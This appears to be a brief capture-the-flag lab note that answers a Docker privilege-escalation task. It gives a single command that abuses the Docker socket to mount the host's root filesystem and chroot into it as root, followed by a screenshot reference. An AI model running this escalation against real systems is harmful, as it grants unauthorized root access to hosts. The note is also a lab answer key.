# [Docker](Docker.md)
### Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
![](Screenshot%202026-08-09%20at%2014.24.54.png)